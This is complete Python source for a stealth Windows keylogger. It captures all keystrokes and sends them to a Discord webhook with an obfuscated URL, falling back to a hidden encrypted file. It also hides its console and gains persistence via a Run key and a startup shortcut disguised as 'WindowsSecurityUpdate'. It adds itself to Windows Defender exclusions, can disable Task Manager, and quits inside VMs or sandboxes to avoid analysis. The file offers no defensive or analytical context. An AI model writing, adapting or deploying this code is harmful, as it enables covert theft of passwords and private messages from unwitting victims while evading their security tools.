import keyboard
import requests
import threading
import time
import os
import sys
import base64
import ctypes
from datetime import datetime
from cryptography.fernet import Fernet
import winreg
import subprocess
import psutil
import win32gui
import win32console
import win32api
import hashlib
import random
import string

class AdvancedStealth:
    """Advanced Anti-Detection & Evasion Techniques"""

    @staticmethod
    def hide_console():
        """Hide console window"""
        try:
            window = win32console.GetConsoleWindow()
            win32gui.ShowWindow(window, 0)
        except:
            pass

    @staticmethod
    def is_admin():
        """Check if running as admin"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    @staticmethod
    def elevate_privileges():
        """Request admin privileges"""
        if not AdvancedStealth.is_admin():
            try:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                sys.exit()
            except:
                pass

    @staticmethod
    def add_to_startup(app_name="SystemUpdate"):
        """Add to Windows startup"""
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)

            startup_folder = os.path.join(
                os.getenv('APPDATA'),
                r'Microsoft\Windows\Start Menu\Programs\Startup'
            )
            startup_link = os.path.join(startup_folder, f"{app_name}.lnk")

            if not os.path.exists(startup_link):
                import win32com.client
                shell = win32com.client.Dispatch("WScript.Shell")
                shortcut = shell.CreateShortCut(startup_link)
                shortcut.Targetpath = exe_path
                shortcut.WorkingDirectory = os.path.dirname(exe_path)
                shortcut.save()

            return True
        except Exception:
            return False

    @staticmethod
    def add_exclusion_defender():
        """Add to Windows Defender exclusions"""
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

            ps_command = f'Add-MpPreference -ExclusionPath "{exe_path}"'

            subprocess.run(
                ['powershell', '-Command', ps_command],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            process_name = os.path.basename(exe_path)
            ps_command2 = f'Add-MpPreference -ExclusionProcess "{process_name}"'

            subprocess.run(
                ['powershell', '-Command', ps_command2],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            return True
        except Exception:
            return False

    @staticmethod
    def disable_task_manager():
        """Disable Task Manager (requires admin)"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass

    @staticmethod
    def anti_vm_detection():
        """Detect if running in VM/Sandbox"""
        indicators = 0

        vm_processes = ['vmtoolsd.exe', 'vboxservice.exe', 'vboxtray.exe', 
                       'sandboxie.exe', 'wireshark.exe', 'fiddler.exe']

        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in vm_processes:
                indicators += 1

        vm_registry_keys = [
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VMTools"),
        ]

        for hkey, path in vm_registry_keys:
            try:
                winreg.OpenKey(hkey, path)
                indicators += 1
            except:
                pass

        if psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024:  

            indicators += 1

        return indicators >= 2  

class EncryptedWebhook:
    """Anti-extraction webhook protection"""

    def __init__(self):

        self._encoded = self._xor_encode("YOUR_WEBHOOK_URL_HERE", "secret_key_123")

    @staticmethod
    def _xor_encode(data, key):
        """XOR encoding for obfuscation"""
        return base64.b64encode(
            bytes([ord(c) ^ ord(key[i % len(key)]) for i, c in enumerate(data)])
        ).decode()

    @staticmethod
    def _xor_decode(data, key):
        """XOR decoding"""
        decoded = base64.b64decode(data)
        return ''.join([chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(decoded)])

    def get_webhook(self):
        """Retrieve webhook URL"""
        return self._xor_decode(self._encoded, "secret_key_123")

    @staticmethod
    def generate_dynamic_webhook(base_parts):
        """Reconstruct webhook from parts at runtime"""

        parts = [
            base64.b64decode(part).decode() for part in base_parts
        ]
        return ''.join(parts)

class StealthKeylogger:
    """Main stealth keylogger class"""

    def __init__(self):
        self.webhook = EncryptedWebhook()
        self.log_buffer = ""
        self.lock = threading.Lock()
        self.session = self._create_stealth_session()
        self.last_send_time = time.time()
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.buffer_size = 150
        self.send_interval = 45

    def _create_stealth_session(self):
        """Create session with randomized headers"""
        session = requests.Session()

        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]

        session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
        })

        return session

    def _encrypt_data(self, data):
        """Encrypt log data"""
        return self.cipher.encrypt(data.encode()).decode()

    def _create_checksum(self, data):
        """Create data checksum for integrity"""
        return hashlib.sha256(data.encode()).hexdigest()[:16]

    def send_to_discord(self):
        """Send encrypted logs to Discord"""
        with self.lock:
            if not self.log_buffer.strip():
                return

            try:

                encrypted_log = self._encrypt_data(self.log_buffer)
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                checksum = self._create_checksum(self.log_buffer)

                data = {
                    "embeds": [{
                        "title": "📊 System Report",
                        "description": f"```{encrypted_log[:1800]}```",
                        "color": random.randint(0, 0xFFFFFF),
                        "footer": {"text": f"ID: {checksum} | {timestamp}"},
                        "fields": [
                            {"name": "Status", "value": "✅ Active", "inline": True},
                            {"name": "Size", "value": f"{len(self.log_buffer)} bytes", "inline": True}
                        ]
                    }]
                }

                max_retries = 3
                for attempt in range(max_retries):
                    try:
                        response = self.session.post(
                            self.webhook.get_webhook(),
                            json=data,
                            timeout=15
                        )

                        if response.status_code == 204:
                            self.log_buffer = ""
                            self.last_send_time = time.time()
                            break
                        else:
                            time.sleep(2 ** attempt)  

                    except:
                        if attempt == max_retries - 1:
                            self._save_to_encrypted_file()
                        time.sleep(2 ** attempt)

            except Exception:
                self._save_to_encrypted_file()

    def _save_to_encrypted_file(self):
        """Backup encrypted logs to hidden file"""
        try:
            hidden_dir = os.path.join(os.getenv('APPDATA'), '.sysconfig')
            os.makedirs(hidden_dir, exist_ok=True)

            ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, 0x02)

            log_file = os.path.join(hidden_dir, f'log_{int(time.time())}.dat')

            with open(log_file, 'wb') as f:
                encrypted = self.cipher.encrypt(self.log_buffer.encode())
                f.write(encrypted)

            self.log_buffer = ""
        except:
            pass

    def on_key_press(self, event):
        """Enhanced key press handler"""
        with self.lock:
            key_name = event.name

            special_keys = {
                "space": " ",
                "enter": "\n",
                "tab": "[TAB]",
                "backspace": "[←]",
                "delete": "[DEL]",
                "esc": "[ESC]",
                "shift": "",
                "ctrl": "",
                "alt": "",
                "caps lock": "",
                "win": "[WIN]"
            }

            if key_name in special_keys:
                if key_name == "backspace" and self.log_buffer:
                    self.log_buffer = self.log_buffer[:-1]
                    return
                self.log_buffer += special_keys[key_name]
            elif len(key_name) == 1:
                self.log_buffer += key_name
            else:
                self.log_buffer += f"[{key_name}]"

            current_time = time.time()
            if (len(self.log_buffer) >= self.buffer_size or
                key_name == "enter" or
                (current_time - self.last_send_time) >= self.send_interval):
                threading.Thread(target=self.send_to_discord, daemon=True).start()

    def start(self):
        """Start keylogger with all protections"""
        keyboard.on_press(self.on_key_press)

        def periodic_send():
            while True:
                time.sleep(self.send_interval)
                if self.log_buffer:
                    self.send_to_discord()

        threading.Thread(target=periodic_send, daemon=True).start()

        keyboard.wait()

def main():
    """Main execution with full stealth"""

    if AdvancedStealth.anti_vm_detection():
        sys.exit(0)  

    AdvancedStealth.hide_console()

    AdvancedStealth.elevate_privileges()

    AdvancedStealth.add_to_startup("WindowsSecurityUpdate")

    if AdvancedStealth.is_admin():
        AdvancedStealth.add_exclusion_defender()

    try:
        keylogger = StealthKeylogger()
        keylogger.start()
    except:
        sys.exit(0)

if __name__ == "__main__":
    main()